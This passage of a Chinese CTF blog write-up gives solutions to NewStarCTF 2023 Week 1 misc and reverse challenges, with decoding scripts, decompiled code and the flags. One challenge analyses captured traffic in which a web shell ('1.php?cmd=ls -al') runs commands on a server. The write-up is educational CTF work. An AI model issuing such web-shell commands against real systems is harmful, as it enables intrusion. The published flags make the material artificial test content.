<h3 id="CyberChef’s-Secret"><a href="#CyberChef’s-Secret" class="headerlink" title="CyberChef’s Secret"></a>CyberChef’s Secret</h3><p>签到题，打开后看到<code>M5YHEUTEKFBW6YJWKZGU44CXIEYUWMLSNJLTOZCXIJTWCZD2IZRVG4TJPBSGGWBWHFMXQTDFJNXDQTA=</code>，进入cyberchef.org，一把梭，拿到flag：<code>flag&#123;Base_15_S0_Easy_^_^&#125;</code>。</p>
<h3 id="机密图片"><a href="#机密图片" class="headerlink" title="机密图片"></a>机密图片</h3><p>zsteg工具</p>
<p>执行<code>zsteg secret.png</code>得到</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-function"><span class="hljs-title">b1</span></span>,r,lsb,xy         .. text: <span class="hljs-string">&quot;:=z^rzwPQb&quot;</span><br><span class="hljs-function"><span class="hljs-title">b1</span></span>,g,lsb,xy         .. <span class="hljs-keyword">file</span>: OpenPGP Public Key<br><span class="hljs-function"><span class="hljs-title">b1</span></span>,b,lsb,xy         .. <span class="hljs-keyword">file</span>: OpenPGP Secret Key<br><span class="hljs-function"><span class="hljs-title">b1</span></span>,rgb,lsb,xy       .. text: <span class="hljs-string">&quot;flag&#123;W3lc0m3_t0_N3wSt4RCTF_2023_7cda3ece&#125;&quot;</span><br><span class="hljs-function"><span class="hljs-title">b3</span></span>,b,lsb,xy         .. <span class="hljs-keyword">file</span>: very old <span class="hljs-number">16</span>-bit-int big-endian archive<br><span class="hljs-function"><span class="hljs-title">b4</span></span>,bgr,msb,xy       .. <span class="hljs-keyword">file</span>: MPEG ADTS, layer I, v2, <span class="hljs-number">112</span> kbps, <span class="hljs-number">24</span> kHz, JntStereo<br></code></pre></td></tr></table></figure>

<p>拿到flag：<code>flag&#123;W3lc0m3_t0_N3wSt4RCTF_2023_7cda3ece&#125;</code></p>
<h3 id="流量！鲨鱼！"><a href="#流量！鲨鱼！" class="headerlink" title="流量！鲨鱼！"></a>流量！鲨鱼！</h3><p>wireshark打开发现流量<code>1.php%3fcmd=ls%20-al%20</code>内容为</p>
<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs tap">total 80<br>drwxr-xr-x  <span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 4096 </span>Aug<span class="hljs-number"> 19 </span>06:17 .<br>drwxr-xr-x  <span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 4096 </span>Aug<span class="hljs-number"> 19 </span>06:17 ..<br>-rwxr-xr-x  <span class="hljs-number"> 1 </span>root root   <span class="hljs-number"> 0 </span>Aug<span class="hljs-number"> 19 </span>06:08 .dockerenv<br>-rw-r--r--  <span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 39 </span>Aug<span class="hljs-number"> 19 </span>06:17 .ffffllllllll11111144444GGGGGG<br>drwxr-xr-x  <span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 4096 </span>Dec<span class="hljs-number"> 21 </span><span class="hljs-number"> 2021 </span>bin<br>drwxr-xr-x  <span class="hljs-number"> 2 </span>root root<span class="hljs-number"> 4096 </span>Dec<span class="hljs-number"> 11 </span><span class="hljs-number"> 2021 </span>boot<br>drwxr-xr-x  <span class="hljs-number"> 5 </span>root root <span class="hljs-number"> 360 </span>Aug<span class="hljs-number"> 19 </span>06:08 dev<br>drwxr-xr-x  <span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 4096 </span>Aug<span class="hljs-number"> 19 </span>06:08 etc<br>drwxr-xr-x  <span class="hljs-number"> 2 </span>root root<span class="hljs-number"> 4096 </span>Dec<span class="hljs-number"> 11 </span><span class="hljs-number"> 2021 </span>home<br>drwxr-xr-x  <span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 4096 </span>Dec<span class="hljs-number"> 21 </span><span class="hljs-number"> 2021 </span>lib<br>drwxr-xr-x  <span class="hljs-number"> 2 </span>root root<span class="hljs-number"> 4096 </span>Dec<span class="hljs-number"> 20 </span><span class="hljs-number"> 2021 </span>lib64<br>drwxr-xr-x  <span class="hljs-number"> 2 </span>root root<span class="hljs-number"> 4096 </span>Dec<span class="hljs-number"> 20 </span><span class="hljs-number"> 2021 </span>media<br>drwxr-xr-x  <span class="hljs-number"> 2 </span>root root<span class="hljs-number"> 4096 </span>Dec<span class="hljs-number"> 20 </span><span class="hljs-number"> 2021 </span>mnt<br>drwxr-xr-x  <span class="hljs-number"> 2 </span>root root<span class="hljs-number"> 4096 </span>Dec<span class="hljs-number"> 20 </span><span class="hljs-number"> 2021 </span>opt<br>dr-xr-xr-x<span class="hljs-number"> 248 </span>root root   <span class="hljs-number"> 0 </span>Aug<span class="hljs-number"> 19 </span>06:08 proc<br>drwx------  <span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 4096 </span>Aug<span class="hljs-number"> 19 </span>06:17 root<br>drwxr-xr-x  <span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 4096 </span>Dec<span class="hljs-number"> 21 </span><span class="hljs-number"> 2021 </span>run<br>drwxr-xr-x  <span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 4096 </span>Dec<span class="hljs-number"> 21 </span><span class="hljs-number"> 2021 </span>sbin<br>drwxr-xr-x  <span class="hljs-number"> 2 </span>root root<span class="hljs-number"> 4096 </span>Dec<span class="hljs-number"> 20 </span><span class="hljs-number"> 2021 </span>srv<br>dr-xr-xr-x <span class="hljs-number"> 13 </span>root root   <span class="hljs-number"> 0 </span>Aug<span class="hljs-number"> 19 </span>06:08 sys<br>drwxrwxrwt  <span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 4096 </span>Dec<span class="hljs-number"> 21 </span><span class="hljs-number"> 2021 </span>tmp<br>drwxr-xr-x  <span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 4096 </span>Dec<span class="hljs-number"> 20 </span><span class="hljs-number"> 2021 </span>usr<br>drwxr-xr-x  <span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 4096 </span>Dec<span class="hljs-number"> 21 </span><span class="hljs-number"> 2021 </span>var<br></code></pre></td></tr></table></figure>

<p>发现啊flag名字<code>.ffffllllllll11111144444GGGGGG</code></p>
<p>启动过滤器<code>frame contains ffffllllllll11111144444GGGGGG</code>，追踪HTTP流，看到flag的两次base64编码：<code>Wm14aFozdFhjbWt6TldnMGNtdGZNWE5mZFRVelpuVnNYMkkzTW1FMk1EazFNemRsTm4wSwo=</code>，base64解密两次得到：<code>flag&#123;Wri35h4rk_1s_u53ful_b72a609537e6&#125;</code></p>
<h3 id="压缩包们"><a href="#压缩包们" class="headerlink" title="压缩包们"></a>压缩包们</h3><p>下载后发现打不开</p>
<p>使用binwalk，<code>binwalk -e task_1 </code>，得到一个压缩包，bandizip打开发现base64编码的注释<code>SSBsaWtlIHNpeC1kaWdpdCBudW1iZXJzIGJlY2F1c2UgdGhleSBhcmUgdmVyeSBjb25jaXNlIGFuZCBlYXN5IHRvIHJlbWVtYmVyLg==</code>，base64解密后得到<code>I like six-digit numbers because they are very concise and easy to remember.</code>，拿爆破工具直接爆破密码，得到232311，拿到flag：<code>flag&#123;y0u_ar3_the_m4ter_of_z1111ppp_606a4adc&#125;</code></p>
<h3 id="空白格"><a href="#空白格" class="headerlink" title="空白格"></a>空白格</h3><p>下载后发现都是空格、Tab和换行，联想到WhiteSpace语言，在网上随便找一个WhiteSpace在线运行环境<a target="_blank" rel="noopener" href="https://www.w3cschool.cn/tryrun/runcode?lang=whitespace">whitespace在线运行,在线工具，在线编译IDE_w3cschool</a>，运行得到flag：<code>flag&#123;w3_h4v3_to0_m4ny_wh1t3_sp4ce_2a5b4e04&#125;</code></p>
<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><p>解题 7&#x2F;8</p>
<h3 id="easy-RE"><a href="#easy-RE" class="headerlink" title="easy_RE"></a>easy_RE</h3><p>下载程序，拖到ida里面打开，能看见flag的前半部分<code>flag&#123;we1c0m</code></p>
<img src="/2023/09/26/2023newstarctfWeek1/re1_up.png" srcset="/img/loading.gif" lazyload class="">

<p>F5反编译，看到后半部分<code>e_to_rev3rse!!&#125;</code>，得到完整flag：<code>flag&#123;we1c0me_to_rev3rse!!&#125;</code></p>
<h3 id="咳"><a href="#咳" class="headerlink" title="咳"></a>咳</h3><p>Upx脱壳<code>upx -d KE.exe</code></p>
<p>反编译代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> __int64 i; <span class="hljs-comment">// r10</span><br>  <span class="hljs-type">char</span> *v4; <span class="hljs-comment">// kr00_8</span><br>  <span class="hljs-type">char</span> Str1[<span class="hljs-number">96</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-88h] BYREF</span><br>  <span class="hljs-type">int</span> v7; <span class="hljs-comment">// [rsp+80h] [rbp-28h]</span><br><br>  _main();<br>  <span class="hljs-built_in">memset</span>(Str1, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(Str1));<br>  v7 = <span class="hljs-number">0</span>;<br>  Hello();<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, Str1);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>i64; ; ++i )<br>  &#123;<br>    v4 = &amp;Str1[<span class="hljs-built_in">strlen</span>(Str1)];<br>    <span class="hljs-keyword">if</span> ( i &gt;= v4 - Str1 )<br>      <span class="hljs-keyword">break</span>;<br>    ++Str1[i];<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strncmp</span>(Str1, enc, v4 - Str1) )<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;WOW!!&quot;</span>);<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;I believe you can do it!&quot;</span>);<br>  system(<span class="hljs-string">&quot;pause&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>其中enc是<code>gmbh|D1ohsbuv2bu21ot1oQb332ohUifG2stuQ[HBMBYZ2fwf2~</code>，</p>
<p>写一个python脚本解密</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">a=<span class="hljs-string">&#x27;gmbh|D1ohsbuv2bu21ot1oQb332ohUifG2stuQ[HBMBYZ2fwf2~&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(i)-<span class="hljs-number">1</span>),end=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure>

<p>得到flag：<code>flag&#123;C0ngratu1at10ns0nPa221ngTheF1rstPZGALAXY1eve1&#125;</code></p>
<h3 id="Segments"><a href="#Segments" class="headerlink" title="Segments"></a>Segments</h3><p>下载附件，拖到ida里，提示shift+F7，直接按，发现段名字中藏着flag</p>
<img src="/2023/09/26/2023newstarctfWeek1/re2.png" srcset="/img/loading.gif" lazyload class="">

<p><code>flag&#123;You_ar3_g0od_at_f1nding_ELF_segments_name&#125;</code></p>
<h3 id="ELF"><a href="#ELF" class="headerlink" title="ELF"></a>ELF</h3><p>反编译，得到c代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v3; <span class="hljs-comment">// edx</span><br>  <span class="hljs-type">char</span> *s1; <span class="hljs-comment">// [rsp+0h] [rbp-20h]</span><br>  <span class="hljs-type">char</span> *v6; <span class="hljs-comment">// [rsp+8h] [rbp-18h]</span><br>  <span class="hljs-type">char</span> *s; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span><br><br>  s = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x64</span>uLL);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Input flag: &quot;</span>);<br>  fgets(s, <span class="hljs-number">100</span>, <span class="hljs-built_in">stdin</span>);<br>  s[<span class="hljs-built_in">strcspn</span>(s, <span class="hljs-string">&quot;\n&quot;</span>)] = <span class="hljs-number">0</span>;<br>  v6 = (<span class="hljs-type">char</span> *)encode(s);<br>  v3 = <span class="hljs-built_in">strlen</span>(v6);<br>  s1 = (<span class="hljs-type">char</span> *)base64_encode(v6, v3);<br>  <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strcmp</span>(s1, <span class="hljs-string">&quot;VlxRV2t0II8kX2WPJ15fZ49nWFEnj3V8do8hYy9t&quot;</span>) )<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Correct&quot;</span>);<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Wrong&quot;</span>);<br>  <span class="hljs-built_in">free</span>(v6);<br>  <span class="hljs-built_in">free</span>(s1);<br>  <span class="hljs-built_in">free</span>(s);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>发现base64，对字符串进行解密</p>
<p>得到<code>V\QWkt $_e&#39;^_ggXQ&#39;u|v!c/m</code></p>
<p>分析encode函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c">_BYTE *__fastcall <span class="hljs-title function_">encode</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *a1)</span><br>&#123;<br>  <span class="hljs-type">size_t</span> v1; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// eax</span><br>  _BYTE *v4; <span class="hljs-comment">// [rsp+20h] [rbp-20h]</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+28h] [rbp-18h]</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [rsp+2Ch] [rbp-14h]</span><br><br>  v1 = <span class="hljs-built_in">strlen</span>(a1);<br>  v4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">2</span> * v1 + <span class="hljs-number">1</span>);<br>  v6 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(a1); ++i )<br>  &#123;<br>    v2 = v6++;<br>    v4[v2] = (a1[i] ^ <span class="hljs-number">0x20</span>) + <span class="hljs-number">16</span>;<br>  &#125;<br>  v4[v6] = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">return</span> v4;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>写出python解密脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">a=<span class="hljs-string">&#x27;V\QWkt $_e\&#x27;^_ggXQ\&#x27;u|v!c/m&#x27;</span><br>b=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    b+=<span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(i)-<span class="hljs-number">16</span>)^<span class="hljs-number">0x20</span>)<br><span class="hljs-built_in">print</span>(b)<br></code></pre></td></tr></table></figure>

<p>得到flag：<code>flag&#123;D04ou7nowwha7ELF1s?&#125;</code></p>
<h3 id="Endian"><a href="#Endian" class="headerlink" title="Endian"></a>Endian</h3><p>反编译，得到：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+4h] [rbp-3Ch]</span><br>  <span class="hljs-type">char</span> *v5; <span class="hljs-comment">// [rsp+8h] [rbp-38h]</span><br>  <span class="hljs-type">char</span> v6[<span class="hljs-number">40</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-30h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v7; <span class="hljs-comment">// [rsp+38h] [rbp-8h]</span><br><br>  v7 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;please input your flag&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%s&quot;</span>, v6);<br>  v5 = v6;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">4</span>; ++i )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( *(_DWORD *)v5 != (<span class="hljs-built_in">array</span>[i] ^ <span class="hljs-number">0x12345678</span>) )<br>    &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;wrong!&quot;</span>);<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    v5 += <span class="hljs-number">4</span>;<br>  &#125;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;you are right&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>其中array为<code>dd 75553A1Eh, 7B583A03h, 4D58220Ch, 7B50383Dh, 736B3819h, 0</code>，shift+e提取数组元素，写出python脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">arrr=[ <span class="hljs-number">1968519710</span>, <span class="hljs-number">2069379587</span>, <span class="hljs-number">1297621516</span>, <span class="hljs-number">2068854845</span>, <span class="hljs-number">1936406553</span>, <span class="hljs-number">0</span> ]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> arrr:<br>    h=((i^<span class="hljs-number">0x12345678</span>))<br>    value = h<br><br>    nums = []<br>    <span class="hljs-keyword">while</span> value &gt; <span class="hljs-number">0</span>:<br>        nums.append(<span class="hljs-built_in">hex</span>(value &amp; <span class="hljs-number">0xFF</span>)) <span class="hljs-comment"># 取出低位部分，并转换为16进制字符串</span><br>        value &gt;&gt;= <span class="hljs-number">8</span> <span class="hljs-comment"># 右移8位，获取下一个位置的部分</span><br>    nums_str = [<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(num,<span class="hljs-number">16</span>)) <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> nums]<br>    result_str = <span class="hljs-string">&#x27;&#x27;</span>.join(nums_str)<br>    <span class="hljs-built_in">print</span>(result_str,end=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure>

<p>执行拿到flag：<code>flag&#123;llittl_Endian_axV4</code></p>
<p>修改一下得到最后flag：<code>flag&#123;llittl_Endian_a&#125;</code></p>
<h3 id="AndroXor"><a href="#AndroXor" class="headerlink" title="AndroXor"></a>AndroXor</h3><p>Android killer打开，java反编译，入口处com.chick.androxor.MainActivity得到关键函数：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">Xor</span><span class="hljs-params">(String paramString1, String paramString2)</span><br> &#123;<br>   <span class="hljs-type">char</span>[] arrayOfChar = <span class="hljs-keyword">new</span> <span class="hljs-title class_">char</span>[paramString1.length()];<br>   <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> paramString1.length();<br>   <span class="hljs-type">String</span> <span class="hljs-variable">str1</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;wrong!!!&quot;</span>;<br>   String str2;<br>   <span class="hljs-keyword">if</span> (i != <span class="hljs-number">25</span>) &#123;<br>     str2 = <span class="hljs-string">&quot;wrong!!!&quot;</span>;<br>   &#125; <span class="hljs-keyword">else</span> &#123;<br>     str2 = <span class="hljs-string">&quot;you win!!!&quot;</span>;<br>   &#125;<br>   <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; paramString1.length(); i++)<br>   &#123;<br>     <span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> (<span class="hljs-type">char</span>)(paramString1.charAt(i) ^ paramString2.charAt(i % paramString2.length()));<br>     arrayOfChar[i] = ((<span class="hljs-type">char</span>)j);<br>     <span class="hljs-keyword">if</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">char</span>[] &#123; <span class="hljs-number">14</span>, <span class="hljs-number">13</span>, <span class="hljs-number">17</span>, <span class="hljs-number">23</span>, <span class="hljs-number">2</span>, <span class="hljs-number">75</span>, <span class="hljs-number">73</span>, <span class="hljs-number">55</span>, <span class="hljs-number">32</span>, <span class="hljs-number">30</span>, <span class="hljs-number">20</span>, <span class="hljs-number">73</span>, <span class="hljs-number">10</span>, <span class="hljs-number">2</span>, <span class="hljs-number">12</span>, <span class="hljs-number">62</span>, <span class="hljs-number">40</span>, <span class="hljs-number">64</span>, <span class="hljs-number">11</span>, <span class="hljs-number">39</span>, <span class="hljs-number">75</span>, <span class="hljs-number">89</span>, <span class="hljs-number">25</span>, <span class="hljs-number">65</span>, <span class="hljs-number">13</span> &#125;[i] != j)<br>     &#123;<br>       str2 = str1;<br>       <span class="hljs-keyword">break</span>;<br>     &#125;<br>   &#125;<br>   <span class="hljs-keyword">return</span> str2;<br> &#125;<br></code></pre></td></tr></table></figure>

<p>在com.chick.androxor.MainActivity$1类中得到key为happyx3</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onClick</span><span class="hljs-params">(View paramView)</span><br> &#123;<br>   <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.val$password.getText().toString();<br>   paramView = <span class="hljs-built_in">this</span>.<span class="hljs-built_in">this</span>$<span class="hljs-number">0</span>;<br>   Toast.makeText(paramView, paramView.Xor(str, <span class="hljs-string">&quot;happyx3&quot;</span>), <span class="hljs-number">1</span>).show();<br>   Log.d(<span class="hljs-string">&quot;输入&quot;</span>, <span class="hljs-built_in">this</span>.val$password.getText().toString());<br> &#125;<br></code></pre></td></tr></table></figure>

<p>编写python脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">key = <span class="hljs-string">&quot;happyx3&quot;</span><br>cipher = [<span class="hljs-number">14</span>, <span class="hljs-number">13</span>, <span class="hljs-number">17</span>, <span class="hljs-number">23</span>, <span class="hljs-number">2</span>, <span class="hljs-number">75</span>, <span class="hljs-number">73</span>, <span class="hljs-number">55</span>, <span class="hljs-number">32</span>, <span class="hljs-number">30</span>, <span class="hljs-number">20</span>, <span class="hljs-number">73</span>, <span class="hljs-number">10</span>, <span class="hljs-number">2</span>, <span class="hljs-number">12</span>, <span class="hljs-number">62</span>, <span class="hljs-number">40</span>, <span class="hljs-number">64</span>, <span class="hljs-number">11</span>, <span class="hljs-number">39</span>, <span class="hljs-number">75</span>, <span class="hljs-number">89</span>, <span class="hljs-number">25</span>, <span class="hljs-number">65</span>, <span class="hljs-number">13</span>]<br><br>result = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(cipher)):<br>    result += <span class="hljs-built_in">chr</span>(cipher[i] ^ <span class="hljs-built_in">ord</span>(key[i % <span class="hljs-built_in">len</span>(key)]))<br><br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure>

<p>得到flag：<code>flag&#123;3z_And0r1d_X0r_x1x1&#125;</code></p>
<h3 id="lazy-activtiy"><a href="#lazy-activtiy" class="headerlink" title="lazy_activtiy"></a>lazy_activtiy</h3><p>安装apk后打开发现要求我们打开另一个Activity来获得flag</p>
<p>查看apk配置文件AndroidManifest.xml</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span> standalone=<span class="hljs-string">&quot;no&quot;</span>?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">manifest</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res/android&quot;</span> <span class="hljs-attr">android:compileSdkVersion</span>=<span class="hljs-string">&quot;32&quot;</span> <span class="hljs-attr">android:compileSdkVersionCodename</span>=<span class="hljs-string">&quot;12&quot;</span> <span class="hljs-attr">package</span>=<span class="hljs-string">&quot;com.droidlearn.activity_travel&quot;</span> <span class="hljs-attr">platformBuildVersionCode</span>=<span 